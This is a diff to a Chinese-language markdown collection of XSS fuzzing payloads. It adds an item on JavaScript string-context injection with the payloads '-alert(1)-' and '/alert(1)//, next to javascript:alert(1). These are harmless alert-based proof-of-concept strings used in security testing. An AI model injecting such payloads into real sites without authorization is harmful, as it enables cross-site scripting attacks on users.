@@ -38,7 +38,13 @@ xss漏洞模糊测试有效载荷的最佳集合 2020版 <br>
 ```
 javascript:alert(1)
 ```
-**5.**
+**5.Javascript Injection (javascript注入) ** <br>
+
+当输入的payload，被插入到javascript脚本块中的字符串定界值内时使用。
+```
+'-alert(1)-'
+'/alert(1)//
+```
 
 ## 致谢
 @brutelogic <br>
